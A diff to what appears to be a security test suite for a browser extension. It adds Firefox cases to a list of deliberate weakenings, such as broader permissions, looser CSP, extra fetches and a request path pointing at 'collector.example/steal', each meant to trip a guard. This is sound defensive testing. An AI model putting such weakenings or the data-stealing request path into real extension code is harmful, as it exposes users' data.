@@ -59,6 +59,14 @@ const cases = [
   ['letting other extensions connect', editManifest(manifest => { manifest.externally_connectable = { matches: ['*://*/*'] }; }), 'manifest'],
   ['a looser CSP', editManifest(manifest => { manifest.content_security_policy.extension_pages = manifest.content_security_policy.extension_pages.replace("connect-src 'none'", 'connect-src *'); }), 'manifest'],
   ['no CSP', editManifest(manifest => { delete manifest.content_security_policy; }), 'manifest'],
+  ['a Firefox build with more reach', folder => {
+    const path = join(folder, 'tools/firefox.json');
+    const config = JSON.parse(readFileSync(path, 'utf8'));
+    config.removePermissions.push('storage');
+    config.addKeys.browser_specific_settings.gecko.data_collection_permissions.required = ['none'];
+    writeFileSync(path, JSON.stringify(config));
+  }, 'firefox'],
+  ['the Firefox background script fetching', append('firefox/background.js', "fetch('/x');"), 'limit'],
   ['a content script on another site', editManifest(manifest => manifest.content_scripts[0].matches.push('https://*/*')), 'manifest'],
   ['a second fetch', append('content/bridge.js', "fetch('/x');"), 'limit'],
   ['an API path that changes the host', append('src/c1-api.js', "request('@collector.example/steal');"), 'request-path'],
